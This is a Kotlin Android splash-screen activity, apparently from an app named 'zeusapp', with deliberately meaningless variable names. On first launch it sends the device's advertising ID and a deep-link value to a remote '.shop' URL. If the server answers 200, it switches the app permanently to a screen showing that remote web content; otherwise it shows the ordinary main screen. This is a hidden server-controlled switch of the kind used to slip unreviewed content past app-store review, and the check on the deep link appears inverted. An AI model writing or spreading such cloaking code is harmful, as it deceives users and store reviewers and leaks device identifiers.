package com.app.zeusapp.ofmain

import android.app.Activity
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.lifecycle.lifecycleScope
import com.app.zeusapp.MainActivity
import com.app.zeusapp.R
import com.app.zeusapp.ofmain.ChikaMika.Companion.FirstChasti

import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.flow.first
import kotlinx.coroutines.launch
import kotlinx.coroutines.withContext
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.Response


class FirstLaunchView : AppCompatActivity() {
    private val SHARED_NAME_PREF_ID = "MainID"
    private val START_KEY_ACTIVITY = "startViewMain"
    private val lastDomKey = ".shop/Y7PNY8"
    private val client = OkHttpClient()

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        setContentView(R.layout.activity_splach_screen)
        val linka = ReplaDpClass(this@FirstLaunchView)
        val prefshareds = getSharedPreferences(SHARED_NAME_PREF_ID, Context.MODE_PRIVATE)

        if (!prefshareds.contains(START_KEY_ACTIVITY)) {
            lifecycleScope.launch {
                val dp = linka.dataInfo().dpLink
                val advert = linka.dataInfo().advertID
                 if (dp.isNullOrBlank()) {
                    val url =   "$FirstChasti$lastDomKey?c=$dp&ad=$advert"
                     when (checkWeb(url)) {
                         200 -> startView(prefshareds, MainViewLaunch::class.java, url)
                         404 -> startView(prefshareds, MainActivity::class.java)
                     }
                } else {
                     startView(prefshareds, MainActivity::class.java)
                }

            }
        } else {
            val strelec = getKey(prefshareds)
            val mintent = Intent(this@FirstLaunchView, strelec)
            startActivity(mintent)
            finish()
        }
    }

    private fun getKey(vgsasd: SharedPreferences): Class<out Activity>? {
        val key = vgsasd.getString(START_KEY_ACTIVITY, null)
        return try {
            key?.let { Class.forName(it).asSubclass(Activity::class.java) }
        } catch (e: ClassNotFoundException) {
            null
        }
    }
    private fun saveKey(sgdhdas: SharedPreferences, shgdfjsad: Class<*>) {
        val vgshad = sgdhdas.edit()
        vgshad.putString(START_KEY_ACTIVITY, shgdfjsad.name)
        vgshad.apply()
    }


    private suspend fun checkWeb(hsfjsfas: String): Int = withContext(Dispatchers.IO) {
        val sghfadasd = Request.Builder().url(hsfjsfas).build()
        try {
            val response: Response = client.newCall(sghfadasd).execute()
            response.code
        } catch (e: Exception) {
            -1
        }
    }


    override fun onDestroy() {
        super.onDestroy()
        client.dispatcher.cancelAll()
        client.connectionPool.evictAll()
    }
    private fun startView(ghasasd: SharedPreferences, hsdffsad: Class<*>, vnmsvfsad: String? = null) {
        saveKey(ghasasd, hsdffsad)
        val intents = Intent(this@FirstLaunchView, hsdffsad)
        vnmsvfsad?.let { intents.putExtra("DOMEN_MAIN_BUNDLE", it) }
        startActivity(intents)
        finish()
    }
}
